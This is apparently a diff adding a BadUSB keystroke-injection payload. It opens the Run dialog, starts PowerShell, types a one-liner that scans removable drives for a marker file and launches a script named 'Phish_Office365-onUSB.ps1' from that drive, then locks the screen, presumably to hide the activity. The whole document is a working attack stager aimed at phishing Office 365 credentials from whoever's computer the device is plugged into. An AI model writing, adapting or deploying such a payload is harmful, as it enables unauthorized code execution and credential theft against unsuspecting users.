@@ -1,0 +1,10 @@
+DELAY 1000
+GUI r
+DELAY 1000
+STRING powershell
+ENTER
+DELAY 2000
+ALTCODE $A="powershell.exe";$B="Phish_Office365-onUSB.ps1";$C="4e657a1d-b1a5-4a75-8e45-9a82791a2f21.txt";$D=$false;while(-not $D){$E=Get-WmiObject -Class Win32_Volume|Where-Object{$_.DriveType -eq 2};foreach($F in $E){$G=Join-Path -Path $F.Name -ChildPath $C;if(Test-Path $G){$D=$true;$H=Join-Path -Path $F.Name -ChildPath $B;Start-Process -FilePath $A -ArgumentList "-File $H -Wait"};break}};Exit
+ENTER
+DELAY 1500
+GUI l
